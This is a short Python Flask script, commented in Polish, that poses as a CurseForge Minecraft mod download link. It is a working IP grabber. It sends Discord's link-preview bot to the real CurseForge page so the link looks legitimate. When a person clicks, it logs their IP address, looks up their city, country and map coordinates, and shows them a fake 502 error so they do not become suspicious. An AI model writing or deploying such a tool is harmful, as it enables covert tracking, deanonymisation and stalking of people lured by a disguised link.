import requests
import sys
from flask import Flask, request, redirect

app = Flask(__name__)

# --- KONFIGURACJA ---
# Oryginalny link, z którego Discord pobierze podgląd
ORIGINAL_MOD_LINK = "https://www.curseforge.com/minecraft/mc-mods/timeless-and-classics-zero/download/7401617"

@app.route('/cdn-download/7401617')
def logger():
    ua = request.headers.get('User-Agent', '')
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]

    # 1. OSZUKIWANIE BOTA (CLOAKING)
    # Jeśli to bot Discorda, wysyłamy go na prawdziwy CurseForge
    if "Discordbot" in ua or "externalhit" in ua.lower():
        return redirect(ORIGINAL_MOD_LINK)

    # 2. LOGOWANIE CZŁOWIEKA
    print(f"\n[!!!] CZŁOWIEK KLIKNĄŁ [!!!]", flush=True)
    print(f"IP: {ip}", flush=True)
    
    try:
        r = requests.get(f"http://ip-api.com/json/{ip}?fields=status,lat,lon,city,country", timeout=5).json()
        if r.get("status") == "success":
            lat, lon = r.get('lat'), r.get('lon')
            # Link do mapy w konsoli
            print(f"LOKALIZACJA: {r.get('city')}, {r.get('country')}", flush=True)
            print(f"MAPA: https://www.google.com/maps?q={lat},{lon}", flush=True)
    except:
        pass
    
    sys.stdout.flush()

    # 3. CO WIDZI CZŁOWIEK
    # Pokazujemy błąd ładowania, żeby nie wzbudzać podejrzeń
    return '<h1>502 Bad Gateway</h1><p>The server returned an invalid response from the upstream server.</p>', 502

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
